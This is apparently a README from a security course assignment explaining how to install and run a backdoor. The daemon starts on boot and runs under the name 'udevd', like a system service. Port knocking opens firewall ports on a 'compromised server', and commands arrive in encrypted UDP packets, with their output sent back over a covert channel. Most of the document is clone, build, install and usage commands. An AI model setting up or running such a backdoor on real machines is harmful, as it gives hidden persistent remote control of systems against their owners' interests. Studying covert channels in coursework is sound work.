To setup the backdoor application, first grab the source from github, then
make it and install it as a daemon if you wish. If you run the daemon 
installation script, the program will automatically start on boot.

Note that all programs involved here are made in debug mode, otherwise we get no 
output to show what is going on in the application.

Since the program is meant to run as a daemon, all debug output is written
using the syslog function. To read the relevant entries in a nicely formatted
way, use the readlog.sh script.

    $ git clone http://github.com/deanmorin/backdoor.git
    $ cd backdoor
    $ git checkout assign3

    $ make debug
    $ ./install_daemon
    $ sudo ./readlog
    $ sudo ./udevd


Once the application is running, you can open any port on the compromised server
by running the knock.sh script (this script requires 'client_util' to be made
first). By default, it opens port 22, but you can edit the script to any port
you like. Please note that the port number needs to be five digits wide, so the
leading zeros are important. Make sure you clear the rules from iptables after
you're done.

    $ make client_util
    $ sudo ./knock <ip>

To prove that it's working, you can add the following rule to iptables before
running the knock script:

    $ sudo iptables --insert INPUT --proto tcp --jump DROP


Finally, you can send commands to be run on the compromised server. This will be
in a single encrypted UDP packet. The backdoor will decrypt the packet and run
the command. The output of the command will be sent back to the client using a
covert channel (the one designed in assignment 1). To receive the output at the
client side, we'll reuse the server application from assignment 1. Download the
code from github, make it, and run the covert channel application in server
mode.

    $ git clone http://github.com/deanmorin/covert.git
    $ cd covert
    $ git checkout assign3
    $ make debug
    $ sudo ./covert -s

Once that's built, run the sendcmd.sh script (part of the backdoor repository).
    $ ./sendcmd.sh <ip> <command>


When you're finished, you may want to remove the backdoor daemon from your
system:

    $ ./uninstall_daemon
